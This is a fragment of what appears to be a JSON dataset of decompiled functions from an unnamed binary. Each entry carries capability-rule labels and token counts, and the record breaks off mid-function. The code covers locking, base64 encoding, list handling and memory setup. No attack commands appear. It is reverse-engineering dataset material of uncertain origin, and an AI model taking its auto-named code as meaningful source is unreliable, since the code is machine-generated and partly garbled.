        "decompiled_code": "\nvoid fcn.00020034(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t *arg1_00;\n    uchar auStack104 [8];\n    uint uStack96;\n    \n    if (((arg1 != 0) && (arg2 != 0)) && (arg1_00 = *(arg2 + 0x10),  arg1_00 != NULL)) {\n        do {\n            if (*arg1_00 == arg3) break;\n            arg1_00 = *(arg1_00 + 6);\n        } while (arg1_00 != NULL);\n        if (arg1_00 != NULL) {\n            if (arg4 != 0) {\n                iVar3 = fcn.00020000(arg2, arg3);\n                if (iVar3 == -1) {\n                    return;\n                }\n                iVar4 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60), auStack104, 0x40, iVar3);\n                if (iVar4 != 0) {\n                    return;\n                }\n                uStack96 = 0xffff;\n                iVar3 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), auStack104, 0x40, iVar3);\n                if (iVar3 != 0) {\n                    return;\n                }\n                *(arg1 + 0x18) = *(arg1 + 0x18) + -1;\n                *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                if (arg4 != 2) {\n                    *(arg1 + 0x2c) = *(arg1 + 0x2c) + 1;\n                    (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c);\n                }\n            }\n            iVar1 = *(arg1_00 + 4);\n            iVar2 = *(arg1_00 + 6);\n            if (iVar1 == 0) {\n                *(arg2 + 0x10) = iVar2;\n            }\n            else {\n                *(iVar1 + 0x18) = iVar2;\n            }\n            if (iVar2 == 0) {\n                *(arg2 + 0x18) = iVar1;\n            }\n            else {\n                *(iVar2 + 0x10) = iVar1;\n            }\n            if (*(arg1_00 + 8) == 0) {\n                *(arg1 + 0x40) = *(arg1_00 + 10);\n            }\n            else {\n                *(*(arg1_00 + 8) + 0x28) = *(arg1_00 + 10);\n            }\n            if (*(arg1_00 + 10) == 0) {\n                *(arg1 + 0x48) = *(arg1_00 + 8);\n            }\n            else {\n                *(*(arg1_00 + 10) + 0x20) = *(arg1_00 + 8);\n            }\n            fcn.0002fc50(arg1_00);\n            if (arg4 != 2) {\n                fcn.0001fe7c(arg2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 766
    },
    "00020640": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.00020640(int64_t *arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    \n    if (arg2 < 10) {\n        fcn.0002f23c(0x88cc0);\n        arg1_00 = *(arg2 * 8 + 0x88cd0);\n        while (arg1_00 != 0) {\n            iVar1 = fcn.0002f464(arg1_00 + 0x88);\n            if (iVar1 != 0) {\n                if (arg3 != 2) {\n                    fcn.0002f2a4(0x88cc0);\n                }\n                *arg4 = arg1_00 + 0x88;\n                *(arg4 + 1) = arg3 == 2;\n                if (arg3 != 2) {\n                    iVar1 = *(arg1_00 + 0x2c);\n                    iVar2 = (**(*(arg1_00 + 0x58) + 0x28))(*(arg1_00 + 0x60), arg1_00 + 8, 0x2c);\n                    if (iVar2 != 0) {\n                        iVar1 = 3;\ncode_r0x00020730:\n                        fcn.0001feb8(arg4);\n                        return iVar1;\n                    }\n                    if (*(arg1_00 + 0x2c) != iVar1) {\n                        iVar1 = fcn.0002041c(arg1_00);\n                        if (iVar1 != 0) goto code_r0x00020730;\n                    }\n                }\n                if (arg1 != NULL) {\n                    *arg1 = arg1_00;\n                }\n                return 0;\n            }\n            fcn.0002f2a4(0x88cc0);\n            (**0x115e0)(0, 0);\n            fcn.0002f23c(0x88cc0);\n            arg1_00 = *(arg2 * 8 + 0x88cd0);\n        }\n        fcn.0002f2a4(0x88cc0);\n    }\n    return 1;\n}\n",
        "token_count": 499
    },
    "0002d9cc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.0002d9cc(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint64_t *puVar4;\n    \n    uVar3 = 0;\n    puVar4 = 0x7a5d0;\n    do {\n        uVar1 = *puVar4;\n        if (((uVar1 != 0) && (uVar1 = *(uVar1 + 0x38),  uVar1 != 0)) && (uVar1 = *(uVar1 + 8),  uVar1 != 0)) {\n            for (uVar2 = *(uVar1 + 0x18); uVar2 != 0; uVar2 = *(uVar2 + 0x18)) {\n                if (*arg1 == uVar2) {\n                    *arg1 = uVar1;\n                    return CONCAT71(uVar1 >> 8, 1);\n                }\n                uVar1 = uVar2;\n            }\n        }\n        uVar3 = uVar3 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar3 < 2);\n    return uVar1 & 0xffffffffffffff00;\n}\n",
        "token_count": 282
    },
    "0002e0b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.0002e0b0(ulong noname_0, uchar *arg2)\n\n{\n    int32_t iVar1;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong *puVar2;\n    ulong uVar3;\n    ulong in_stack_fffffffffffffc80;\n    uint uVar4;\n    uint uVar5;\n    ulong in_stack_fffffffffffffc88;\n    uint32_t uVar6;\n    uint uVar7;\n    uint auStack840 [2];\n    ulong uStack832;\n    uchar *puStack824;\n    uint uStack816;\n    ulong uStack808;\n    ulong uStack800;\n    ulong uStack792;\n    uchar auStack784 [8];\n    int64_t iStack776;\n    uchar auStack768 [24];\n    uchar auStack744 [96];\n    uchar auStack648 [96];\n    uchar auStack552 [518];\n    ushort uStack34;\n    \n    uVar4 = in_stack_fffffffffffffc80 >> 0x20;\n    uVar6 = in_stack_fffffffffffffc88 >> 0x20;\n    fcn.000289a0(auStack648, 0x52);\n    fcn.00028950(auStack744, 0x52);\n    fcn.00061a0e(auStack552, 0x104, 0x14060, auStack648, auStack744);\n    uStack34 = 0;\n    fcn.000619f0(auStack768, auStack552);\n    uVar7 = 0;\n    puStack824 = auStack768;\n    puVar2 = &uStackX24;\n    uVar3 = CONCAT44(uVar4, 0x80);\n    auStack840[0] = 0x30;\n    uStack832 = 0;\n    uStack816 = 0x40;\n    uStack808 = 0;\n    uStack800 = 0;\n    uStackX24 = 0x6400000;\n    iVar1 = fcn.0001dda0(0x7a588, 3, auStack840, auStack784, puVar2, uVar3, uVar6 << 0x20, 3, 0x868, 0, 0);\n    uVar4 = puVar2 >> 0x20;\n    uVar5 = uVar3 >> 0x20;\n    if (iVar1 == 0) {\n        *(*0x64080 + 0x20) = *0x7a588;\n        if ((iStack776 == 2) || (iStack776 == 3)) {\n            uStack792 = uStackX24;\n            uVar3 = CONCAT44(uVar4, 0x14);\n            iVar1 = fcn.00061a1a(*0x7a588, auStack784, &uStack792, 8, uVar3);\n            uVar4 = uVar3 >> 0x20;\n            if (iVar1 != 0) goto code_r0x0002e2f8;\n            *arg2 = 1;\n        }\n        else {\n            *arg2 = 0;\n        }\n        auStack840[0] = 0x30;\n        uStack832 = 0;\n        uStack816 = 0;\n        puStack824 = NULL;\n        uStack808 = 0;\n        uStack800 = 0;\n        iVar1 = fcn.00061b46(0x7a5a0, 6, auStack840, 0, CONCAT44(uVar4, 4), CONCAT44(uVar5, 0x18000000), *0x7a588);\n        if (iVar1 == 0) {\n            uStackX32 = 0;\n            iVar1 = fcn.00061b40(*0x7a5a0, 0xffffffffffffffff, 0x7a5b0, 0, 0, 0, &uStackX32, 2, 0, CONCAT44(uVar7, 4));\n            if (iVar1 == 0) {\n                *0x7a5c0 = uStackX32;\n                return 0;\n            }\n        }\n    }\ncode_r0x0002e2f8:\n    if (*0x7a5b0 != 0) {\n        fcn.00061b3a(0xffffffffffffffff);\n        *0x7a5b0 = 0;\n    }\n    if (*0x7a5a0 != 0) {\n        fcn.000619de();\n        *0x7a5a0 = 0;\n    }\n    fcn.000619de(*0x7a588);\n    *0x7a588 = 0;\n    return iVar1;\n}\n",
        "token_count": 1050
    },
    "0002eed8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0002eed8(int64_t arg1, uint *arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    char cVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    char *pcVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint8_t auStackX16 [16];\n    uint uStackX32;\n    char acStack120 [26];\n    char acStack94 [26];\n    char acStack68 [10];\n    uchar uStack58;\n    uchar uStack57;\n    \n    iVar10 = 0;\n    bVar2 = false;\n    iVar6 = 0;\n    pcVar8 = acStack94;\n    do {\n        cVar3 = iVar6;\n        pcVar8[-0x1a] = cVar3 + 'A';\n        iVar6 = iVar6 + 1;\n        *pcVar8 = cVar3 + 'a';\n        pcVar8 = pcVar8 + 1;\n    } while (iVar6 < 0x1a);\n    iVar6 = 0;\n    pcVar8 = acStack68;\n    do {\n        cVar3 = iVar6;\n        iVar6 = iVar6 + 1;\n        *pcVar8 = cVar3 + '0';\n        pcVar8 = pcVar8 + 1;\n    } while (iVar6 < 10);\n    iVar7 = 0;\n    uStack58 = 0x2b;\n    uStack57 = 0x2f;\n    puVar9 = arg2;\n    do {\n        iVar6 = 0;\n        auStackX16[2] = 0;\n        auStackX16[1] = 0;\n        auStackX16[0] = 0;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar7 + arg1;\n            iVar7 = iVar7 + 1;\n            iVar5 = iVar4 + 1;\n            auStackX16[iVar4] = *puVar1;\n            iVar6 = iVar6 + 1;\n            if (iVar7 == arg3) {\n                bVar2 = true;\n                break;\n            }\n            iVar4 = iVar5;\n        } while (iVar5 < 3);\n        if (0 < iVar6) {\n            uStackX32._0_3_ =\n                 CONCAT12(acStack120[(auStackX16[1] & 0xf) << 2 | auStackX16[2] >> 6], \n                          CONCAT11(acStack120[(auStackX16[0] & 3) << 4 | auStackX16[1] >> 4], \n                                   acStack120[auStackX16[0] >> 2]));\n            uStackX32 = CONCAT13(acStack120[auStackX16[2] & 0x3f], uStackX32);\n            if (iVar6 < 3) {\n                cVar3 = acStack120[(auStackX16[1] & 0xf) << 2 | auStackX16[2] >> 6];\n                if (iVar6 < 2) {\n                    cVar3 = '=';\n                }\n                uStackX32._0_3_ =\n                     CONCAT12(cVar3, CONCAT11(acStack120[(auStackX16[0] & 3) << 4 | auStackX16[1] >> 4], \n                                              acStack120[auStackX16[0] >> 2]));\n                uStackX32 = CONCAT13(0x3d, uStackX32);\n            }\n        }\n        iVar10 = iVar10 + 4;\n        *puVar9 = uStackX32;\n        puVar9 = puVar9 + 1;\n        if (bVar2) {\n            *(iVar10 + arg2) = 0;\n            return iVar10;\n        }\n    } while( true );\n}\n",
        "token_count": 886
    },
    "000313f0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.000313f0(uint64_t *arg1, ulong arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if (arg2 == 0) {\n        LOCK();\n        *arg1 = *arg1 + 1;\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n        while (!bVar5) {\n            LOCK();\n            *arg1 = *arg1 - 1;\n            uVar3 = fcn.00061a9e();\n            uVar4 = 0;\n            if (uVar3 != (uVar3 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar3 = fcn.00061a9e();\n                } while (uVar4 < uVar3 % 10);\n            }\n            LOCK();\n            *arg1 = *arg1 + 1;\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n        }\n    }\n    else if (arg2 == 1) {\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        while (!bVar5) {\n            uVar3 = fcn.00061a9e();\n            uVar4 = 0;\n            if (uVar3 != (uVar3 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar3 = fcn.00061a9e();\n                } while (uVar4 < uVar3 % 10);\n            }\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        }\n        do {\n            LOCK();\n            uVar2 = *arg1;\n            *arg1 = *arg1 ^ (uVar2 == 0) * *arg1;\n        } while (uVar2 != 0);\n    }\n    else if (arg2 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + 1;\n    }\n    return;\n}\n",
        "token_count": 605
    },
    "00031510": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.00031510(uint64_t *arg1, ulong arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    \n    if (arg2 == 0) {\n        LOCK();\n        *arg1 = *arg1 + 1;\n        LOCK();\n        puVar1 = arg1 + 1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * *puVar1;\n        if (uVar2 == 0) {\n            return 1;\n        }\n        LOCK();\n        *arg1 = *arg1 - 1;\n    }\n    else if (arg2 == 1) {\n        LOCK();\n        puVar1 = arg1 + 1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * (*puVar1 ^ 1);\n        if (uVar2 == 0) {\n            LOCK();\n            uVar2 = *arg1;\n            *arg1 = *arg1 ^ (uVar2 == 0) * *arg1;\n            if (uVar2 == 0) {\n                return 1;\n            }\n            LOCK();\n            arg1[1] = arg1[1] - 1;\n        }\n    }\n    else if (arg2 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + 1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 339
    },
    "00031564": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.00031564(uint64_t *arg1, uint8_t *arg2, ulong arg3)\n\n{\n    uint64_t *puVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    iVar3 = (**0x115f0)();\n    *arg2 = iVar3;\n    if (iVar3 < 2) {\n        iVar3 = (**0x111f0)();\n    }\n    if (arg3 == 0) {\n        LOCK();\n        *arg1 = *arg1 + 1;\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n        iVar3 = !bVar5 * *puVar1;\n        while (!bVar5) {\n            LOCK();\n            *arg1 = *arg1 - 1;\n            uVar2 = fcn.00061a9e();\n            uVar4 = 0;\n            if (uVar2 != (uVar2 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar2 = fcn.00061a9e();\n                } while (uVar4 < uVar2 % 10);\n            }\n            LOCK();\n            *arg1 = *arg1 + 1;\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n            iVar3 = !bVar5 * *puVar1;\n        }\n    }\n    else if (arg3 == 1) {\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        while (!bVar5) {\n            uVar2 = fcn.00061a9e();\n            uVar4 = 0;\n            if (uVar2 != (uVar2 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar2 = fcn.00061a9e();\n                } while (uVar4 < uVar2 % 10);\n            }\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        }\n        do {\n            LOCK();\n            bVar5 = *arg1 == 0;\n            *arg1 = *arg1 ^ bVar5 * *arg1;\n            iVar3 = !bVar5 * *arg1;\n        } while (!bVar5);\n    }\n    else if (arg3 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 692
    },
    "000315d4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.000315d4(ulong *arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    ulong uVar3;\n    uint8_t auStackX8 [32];\n    \n    fcn.00031564(arg1, auStackX8, 1);\n    do {\n        LOCK();\n        puVar1 = arg1 + 2;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * *puVar1;\n    } while (uVar2 != 0);\n    *arg1 = 0;\n    uVar3 = arg1[1];\n    arg1[1] = 0;\n    uVar2 = arg1[2];\n    arg1[2] = 0;\n    if (auStackX8[0] < 2) {\n        uVar3 = (*_fcn.000111e0)(uVar2 & 0xffffffffffffff00 | auStackX8[0]);\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "0003354c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0003354c(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong unaff_RBX;\n    int64_t arg3_00;\n    ulong unaff_RBP;\n    ulong uVar3;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    uchar *arg4;\n    ulong unaff_R12;\n    ulong in_stack_00000000;\n    uint32_t in_stack_00000008;\n    uint in_stack_0000000c;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    \n    arg3_00 = 0;\n    if (arg1 == 0) {\n        return 0xc00000ef;\n    }\n    if (arg2 != 0) {\n        if (arg3 == 0) {\n            uVar3 = 0x3302c;\n        }\n        else {\n            if (arg3 != 2) {\n                return 0xc00000f1;\n            }\n            uVar3 = 0x33104;\n        }\n        arg4 = &stack0x00000008;\n        uVar1 = fcn.00051574(arg2, 0x50, 5, arg4);\n        if (uVar1 != 0) {\n            return uVar1;\n        }\n        if (4 < in_stack_00000008) {\n            fcn.00031564(0x7b1c0, &stack0x00000020, 1);\n            iVar2 = fcn.00032eb0(arg1, 1);\n            if (iVar2 != 0) {\n                if (arg3 == 0) {\n                    arg3_00 = iVar2 + 0x10;\n                }\n                else if (arg3 == 2) {\n                    arg3_00 = iVar2 + 0x18;\n                }\n            }\n            fcn.00031598(0x7b1c0, &stack0x00000020, 1);\n            uVar3 = fcn.00051f30(arg2, uVar3, arg3_00, arg4, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                 in_stack_00000000, CONCAT44(in_stack_0000000c, in_stack_00000008), in_stack_00000010, \n                                 in_stack_00000018, in_stack_00000020, in_stack_00000028, in_stack_00000030, \n                                 in_stack_00000038, in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                 in_stack_00000058, in_stack_00000060, in_stack_00000068, in_stack_00000070);\n            return uVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 741
    },
    "0003d528": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0003d528(int64_t *arg1, ulong arg2)\n\n{\n    int64_t **ppiVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong *arg1_00;\n    int64_t *piVar4;\n    uchar auStackX24 [16];\n    \n    fcn.00031564(0x7b540, auStackX24, 1);\n    piVar4 = *0x7b560;\n    if (*0x7b558 != 0x7b558) {\n        do {\n            if (arg1 == piVar4) goto code_r0x0003d581;\n            ppiVar1 = piVar4 + 1;\n            piVar4 = *ppiVar1;\n        } while (*ppiVar1 != 0x7b558);\n        piVar4 = NULL;\ncode_r0x0003d581:\n        if ((piVar4 != NULL) && (((arg2 != 0 || (*(arg1 + 0xcc) == 0)) || (*(arg1 + 0xcb) != 2)))) {\n            iVar2 = *arg1;\n            piVar4 = arg1[1];\n            *piVar4 = iVar2;\n            *(iVar2 + 8) = piVar4;\n            fcn.00031598(0x7b540, auStackX24, 1);\n            fcn.00031564(arg1 + 0xd0, auStackX24, 0);\n            arg1_00 = arg1[0xd6];\n            while (arg1_00 != NULL) {\n                puVar3 = *arg1_00;\n                fcn.0002fc50(arg1_00[3]);\n                fcn.0002fc50(arg1_00);\n                arg1_00 = puVar3;\n            }\n            fcn.00031598(arg1 + 0xd0, auStackX24, 0);\n            fcn.000315d4(arg1 + 0xd0);\n            fcn.0003de70(*(arg1 + 0xc9), *(arg1 + 0x64c));\n            fcn.0003d070(*(arg1 + 0xca), *(arg1 + 0x654), *(arg1 + 0xc9));\n            fcn.0002fc50(arg1);\n            return;\n        }\n    }\n    fcn.00031598(0x7b540, auStackX24, 1);\n    return;\n}\n",
        "token_count": 546
    },
    "000463c4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.000463c4(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    uint32_t uVar4;\n    ulong *puVar5;\n    uint32_t uVar6;\n    \n    uVar2 = 0;\n    uVar4 = arg2;\n    uVar1 = (**0x113d0)(0x87c80);\n    uVar6 = 0;\n    puVar5 = *0x7b8b0;\n    do {\n        for (puVar3 = *puVar5; puVar3 != NULL; puVar3 = *puVar3) {\n            if ((((puVar3[6] != 0) && (*(puVar3 + 8) == 2)) && (*(puVar3 + 0x156) == arg3)) &&\n               (*(puVar3 + 0x154) == arg4)) {\n                uVar2 = *(puVar3 + 0x40);\n                goto code_r0x00046436;\n            }\n        }\n        uVar6 = uVar6 + 1;\n        puVar5 = puVar5 + 1;\n        if (0xfff < uVar6) {\ncode_r0x00046436:\n            (**0x113c0)(0x87c80, uVar4 & 0xffffff00 | uVar1);\n            if (uVar2 == 0) {\n                uVar2 = fcn.00031dd0(arg2 & 0xffff);\n            }\n            return uVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 369
    },
    "0004bc50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004bc50(ulong arg1, uint64_t *arg2, int64_t *arg3)\n\n{\n    uint64_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t *puVar6;\n    uint64_t uVar7;\n    int64_t aiStackX16 [2];\n    int64_t iStackX32;\n    int64_t iStack432;\n    int64_t iStack424;\n    int64_t iStack416;\n    uchar auStack408 [24];\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint16_t uStack372;\n    uint16_t uStack370;\n    uint uStack368;\n    uint16_t uStack364;\n    uint16_t uStack362;\n    uint32_t uStack360;\n    uint uStack356;\n    ushort uStack352;\n    uint uStack340;\n    int32_t iStack328;\n    int32_t iStack324;\n    int32_t iStack320;\n    int32_t iStack316;\n    int32_t iStack312;\n    int32_t iStack308;\n    ulong uStack296;\n    uint32_t uStack284;\n    int64_t iStack272;\n    uchar auStack264 [48];\n    uint64_t uStack216;\n    uint64_t uStack208;\n    uint uStack200;\n    uint16_t uStack192;\n    uint16_t uStack190;\n    int64_t iStack184;\n    uint16_t uStack176;\n    uint16_t uStack174;\n    int64_t iStack168;\n    uint uStack160;\n    ushort uStack156;\n    uint uStack136;\n    uint64_t uStack112;\n    uint64_t uStack104;\n    uint64_t uStack96;\n    uint64_t uStack88;\n    uint64_t uStack80;\n    uint64_t uStack72;\n    \n    iStackX32 = 0;\n    iStack416 = 0;\n    if (arg2 == NULL) {\n        iVar3 = 0x21590066;\n    }\n    else if (arg3 == NULL) {\n        iVar3 = 0x21590067;\n    }\n    else {\n        *arg3 = 0;\n        iVar3 = fcn.00049f40(&iStackX32, 0x438, arg1);\n        if ((iVar3 == 0) && (iVar3 = fcn.00049d80(iStackX32, aiStackX16),  iVar3 == 0)) {\n            iVar3 = fcn.0004b164(iStackX32, &uStack296);\n            if (iVar3 == 0) {\n                if (aiStackX16[0] == '\\0') {\n                    aiStackX16[0] = 0;\n                    iVar3 = fcn.00049dcc(iStackX32, uStack296, &uStack296, 0x20);\n                    if (iVar3 == 0) {\n                        if (iStack272 == 0) {\n                            iVar3 = -1;\n                        }\n                        else {\n                            fcn.00061a56(auStack264, 0, 200);\n                            uStack216 = *arg2;\n                            uStack200 = *(arg2 + 1);\n                            uStack136 = *(arg2 + 0xc);\n                            uStack160 = 0x1004;\n                            uStack208 = arg2[2];\n                            uStack156 = 1;\n                            iVar5 = -1;\n                            iVar4 = iVar5;\n                            puVar6 = arg2 + 3;\n                            do {\n                                if (iVar4 == 0) break;\n                                iVar4 = iVar4 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack176 = (~iVar4 - 1) * 2;\n                            if (uStack176 < 2) {\n                                uStack176 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack174 = uStack176 + 2;\n                            puVar6 = arg2 + 0x44;\n                            do {\n                                if (iVar5 == 0) break;\n                                iVar5 = iVar5 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack192 = (~iVar5 - 1) * 2;\n                            if (uStack192 < 2) {\n                                uStack192 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack190 = uStack192 + 2;\n                            aiStackX16[0] = 0;\n                            iStack424 = uStack190 + 200 + uStack174;\n                            iVar3 = fcn.00061bdc(iStackX32, aiStackX16, 0, &iStack424, 0x3000, 4);\n                            if (iVar3 == 0) {\n                                iStack416 = aiStackX16[0];\n                                iStack168 = aiStackX16[0] + 200;\n                                iVar3 = fcn.00049dfc(iStackX32, iStack168, arg2 + 3, uStack174);\n                                if (iVar3 == 0) {\n                                    iStack184 = uStack174 + 200 + aiStackX16[0];\n                                    iVar3 = fcn.00049dfc(iStackX32, iStack184, arg2 + 0x44, uStack190);\n                                    if (iVar3 == 0) {\n                                        iVar3 = aiStackX16[0];\n                                        uStack112 = iVar3 + 0x98;\n                                        uStack96 = iVar3 + 0xa8;\n                                        uStack80 = iVar3 + 0xb8;\n                                        uStack104 = uStack112;\n                                        uStack88 = uStack96;\n                                        uStack72 = uStack80;\n                                        iVar3 = 